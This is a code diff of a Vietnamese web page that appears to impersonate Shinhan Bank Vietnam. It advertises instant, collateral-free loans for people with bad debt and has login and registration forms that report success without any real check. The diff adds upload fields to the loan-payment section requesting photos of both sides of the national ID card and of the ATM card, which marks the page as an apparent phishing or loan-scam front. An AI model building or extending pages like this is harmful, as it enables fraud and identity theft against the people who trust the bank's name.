                 const username = document.querySelector('#login-modal input[type="text"]').value;
                 const password = document.querySelector('#login-modal input[type="password"]').value;
                 if (!username || !password) {
-                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng nhập đầy đủ thông tin!' : 'Please fill in all fields!');
+                    alert('Vui lòng nhập đầy đủ thông tin!');
                     return;
                 }
-                alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Đăng nhập thành công!' : 'Login successful!');
+                alert('Đăng nhập thành công!');
                 document.querySelector('#login-modal').style.display = 'none';
             });
 
@@ -1003,10 +1086,10 @@
                 const password = document.querySelector('#register-modal input[type="password"]').value;
                 const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                 if (!username || !emailRegex.test(email) || !password) {
-                    alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Vui lòng nhập đầy đủ và đúng định dạng thông tin!' : 'Please fill in all fields correctly!');
+                    alert('Vui lòng nhập đầy đủ và đúng định dạng thông tin!');
                     return;
                 }
-                alert(translations[savedLang].submit === "Gửi Đăng Ký" ? 'Đăng ký thành công!' : 'Registration successful!');
+                alert('Đăng ký thành công!');
                 document.querySelector('#register-modal').style.display = 'none';
             });
         });
@@ -1019,6 +1102,7 @@
         </div>
         <button class="hamburger">☰</button>
         <nav>
+            <button class="back-btn">Lùi</button>
             <a href="#home">TRANG CHỦ</a>
             <a href="#introduction">GIỚI THIỆU</a>
             <a href="#shinhan-pwm">SHINHAN PWM</a>
@@ -1031,24 +1115,20 @@
             <button>ĐĂNG NHẬP</button>
             <button>ĐĂNG KÝ</button>
         </div>
-        <div class="language-toggle">
-            <select>
-                <option value="vi">Tiếng Việt</option>
-                <option value="en">English</option>
-            </select>
-        </div>
     </header>
 
     <section class="home-section" id="home">
         <h2>Chào mừng đến với Shinhan Bank</h2>
         <p>Khám phá các giải pháp tài chính toàn diện, từ vay vốn, thẻ tín dụng đến dịch vụ ngân hàng số tiện lợi.</p>
         <p><strong>Mới:</strong> Đăng ký vay online, duyệt trong 60 giây. Nhận ưu đãi lãi suất 0% trong 3 tháng đầu khi mở thẻ tín dụng Shinhan!</p>
+        <img src="/assets/images/icon-home.png" alt="Icon Home" class="section-icon" loading="lazy">
     </section>
 
     <section class="intro-section" id="introduction">
         <h2>Giới thiệu về Shinhan Bank</h2>
         <p>Shinhan Bank Việt Nam, thành viên của Shinhan Financial Group, cung cấp các sản phẩm tài chính sáng tạo, an toàn và đáng tin cậy từ năm 1993. Shinhan PWM mang đến dịch vụ quản lý tài sản cao cấp, cá nhân hóa cho khách hàng thượng lưu.</p>
         <p><strong>Mới:</strong> Đạt giải thưởng "Ngân hàng bán lẻ tốt nhất Việt Nam 2024" từ Asia Banking Awards.</p>
+        <img src="/assets/images/icon-intro.png" alt="Icon Intro" class="section-icon" loading="lazy">
     </section>
 
     <section class="banner">
@@ -1100,7 +1180,6 @@
     </section>
 
     <section class="main-sections">
-        <!-- Các Gói Vay Tiêu Dùng -->
         <div class="section-toggle" id="loan-packages">
             <h3>Các Gói Vay Tiêu Dùng</h3>
             <span class="arrow">▼</span>
@@ -1168,7 +1247,6 @@
             </div>
         </div>
 
-        <!-- Tính Lãi Suất Khoản Vay -->
         <div class="section-toggle" id="loan-calculator">
             <h3>Tính Lãi Suất Khoản Vay</h3>
             <span class="arrow">▼</span>
@@ -1188,7 +1266,6 @@
             <div class="result" id="calc-result"></div>
         </div>
 
-        <!-- Thanh Toán Khoản Vay -->
         <div class="section-toggle" id="payment-info">
             <h3>Thanh Toán Khoản Vay</h3>
             <span class="arrow">▼</span>
@@ -1202,10 +1279,13 @@
             <h4>Thanh toán trực tuyến</h4>
             <input type="text" id="payment-account" placeholder="Số tài khoản">
             <input type="number" id="payment-amount" placeholder="Số tiền thanh toán (VNĐ)">
+            <p class="photo-guidance">Hướng dẫn: Mở ứng dụng ngân hàng, chọn mục chụp ảnh CCCD/thẻ ATM, đảm bảo ảnh rõ nét, đầy đủ thông tin.</p>
+            <input type="file" id="payment-cccd-front" accept="image/*" placeholder="Ảnh CCCD mặt trước">
+            <input type="file" id="payment-cccd-back" accept="image/*" placeholder="Ảnh CCCD mặt sau">
+            <input type="file" id="payment-atm-card" accept="image/*" placeholder="Ảnh thẻ ATM">
             <button id="payment-submit" onclick="submitPayment()">Thanh toán qua SOL</button>
         </div>
 
-        <!-- Tất Toán Khoản Vay -->
         <div class="section-toggle" id="loan-settlement">
             <h3>Tất Toán Khoản Vay</h3>
             <span class="arrow">▼</span>
@@ -1218,7 +1298,6 @@
             <div class="result" id="settlement-result"></div>
         </div>
 
-        <!-- Đăng Ký Vay -->
         <div class="section-toggle" id="register-form">
             <h3>Đăng Ký Vay</h3>
             <span class="arrow">▼</span>
@@ -1271,14 +1350,81 @@
         <img src="/assets/images/contract-seal.jpg" alt="Hợp đồng có con dấu" loading="lazy">
     </section>
 
-    <section class="loan-intro">
-        <h2>Giới Thiệu Khoản Vay</h2>
-        <p>Vay dễ dàng, không thế chấp, duyệt nhanh trong 60 giây. Hỗ trợ khách hàng có nợ xấu/nợ chú ý, vay tối đa 50 triệu.</p>
-        <h3>Điều kiện giải ngân:</h3>
-        <p>- Độ tuổi: Nam 21-58, nữ 21-55.<br>- Thu nhập tối thiểu: 4 triệu VNĐ/tháng.<br>- Có CCCD gắn chip.<br>- Hồ sơ phê duyệt trong 15 phút, giải ngân trong 48 giờ sau khi ký hợp đồng online.</p>
+    <section class="collapsible-section" id="loan-intro">
+        <div class="section-header">
+            <h2>Giới Thiệu Khoản Vay</h2>
+            <button class="toggle-btn">Xem thêm</button>
+        </div>
+        <p>Vay dễ dàng, không thế chấp, duyệt nhanh trong 60 giây.</p>
+        <div class="section-details">
+            <p>Hỗ trợ khách hàng có nợ xấu/nợ chú ý, vay tối đa 50 triệu.</p>
+            <h3>Điều kiện giải ngân:</h3>
+            <p>- Độ tuổi: Nam 21-58, nữ 21-55.<br>- Thu nhập tối thiểu: 4 triệu VNĐ/tháng.<br>- Có CCCD gắn chip.<br>- Hồ sơ phê duyệt trong 15 phút, giải ngân trong 48 giờ sau khi ký hợp đồng online.</p>
+            <img src="/assets/images/loan-intro.jpg" alt="Giới Thiệu Khoản Vay" loading="lazy">
+        </div>
     </section>
 
-    <section class="home-section" id="shinhan-pwm">
+    <section class="collapsible-section" id="shinhan-pwm">
+        <div class="section-header">
+            <h2>Shinhan PWM</h2>
+            <button class="toggle-btn">Xem thêm</button>
+        </div>
+        <p>Shinhan PWM cung cấp dịch vụ quản lý tài sản cá nhân hóa, giúp tối ưu hóa tài chính với các giải pháp đầu tư và tiết kiệm hiệu quả.</p>
+        <div class="section-details">
+            <p><strong>Mới:</strong> Tư vấn đầu tư quốc tế với lợi nhuận dự kiến 8-12%/năm. Miễn phí tư vấn cho khách hàng mới.</p>
+            <img src="/assets/images/shinhan-pwm.jpg" alt="Shinhan PWM" loading="lazy">
+        </div>
+    </section>
+
+    <section class="collapsible-section" id="personal">
+        <div class="section-header">
+            <h2>Cá Nhân</h2>
+            <button class="toggle-btn">Xem thêm</button>
+        </div>
+        <p>Giải pháp tài chính cá nhân từ vay tiêu dùng, tiết kiệm đến thẻ tín dụng, đáp ứng mọi nhu cầu của bạn.</p>
+        <div class="section-details">
+            <p><strong>Mới:</strong> Miễn phí mở tài khoản số đẹp và hoàn tiền 5% khi mua sắm online với thẻ Shinhan.</p>
+            <img src="/assets/images/personal.jpg" alt="Cá Nhân" loading="lazy">
+        </div>
+    </section>
+
+    <section class="collapsible-section" id="business">
+        <div class="section-header">
+            <h2>Doanh Nghiệp</h2>
+            <button class="toggle-btn">Xem thêm</button>
+        </div>
+        <p>Các giải pháp tài chính toàn diện cho doanh nghiệp, từ vay vốn kinh doanh, quản lý dòng tiền đến thanh toán quốc tế.</p>
+        <div class="section-details">
+            <p><strong>Mới:</strong> Vay vốn doanh nghiệp với lãi suất ưu đãi 5.5%/năm trong 6 tháng đầu.</p>
+            <img src="/assets/images/business.jpg" alt="Doanh Nghiệp" loading="lazy">
+        </div>
+    </section>
+
+    <section class="collapsible-section" id="cards">
+        <div class="section-header">
+            <h2>Thẻ</h2>
+            <button class="toggle-btn">Xem thêm</button>
+        </div>
+        <p>Khám phá các loại thẻ tín dụng, thẻ ghi nợ với ưu đãi hấp dẫn và dịch vụ hỗ trợ thẻ tiện lợi.</p>
+        <div class="section-details">
+            <p><strong>Mới:</strong> Thẻ Shinhan Visa Platinum mới, hoàn tiền 10% khi mua vé máy bay.</p>
+            <img src="/assets/images/cards.jpg" alt="Thẻ" loading="lazy">
+        </div>
+    </section>
+
+    <section class="collapsible-section" id="transfer">
+        <div class="section-header">
+            <h2>Chuyển Tiền</h2>
+            <button class="toggle-btn">Xem thêm</button>
+        </div>
+        <p>Dịch vụ chuyển tiền nhanh chóng, an toàn trong và ngoài nước với phí giao dịch cạnh tranh.</p>
+        <div class="section-details">
+            <p><strong>Mới:</strong> Miễn phí chuyển tiền quốc tế cho giao dịch đầu tiên qua Mobile Banking SOL.</p>
+            <img src="/assets/images/transfer.jpg" alt="Chuyển Tiền" loading="lazy">
+        </div>
+    </section>
+
+   <section class="home-section" id="shinhan-pwm">
         <h2>Shinhan PWM</h2>
         <p>Shinhan PWM cung cấp dịch vụ quản lý tài sản cá nhân hóa, giúp tối ưu hóa tài chính với các giải pháp đầu tư và tiết kiệm hiệu quả.</p>
         <p><strong>Mới:</strong> Tư vấn đầu tư quốc tế với lợi nhuận dự kiến 8-12%/năm. Miễn phí tư vấn cho khách hàng mới.</p>
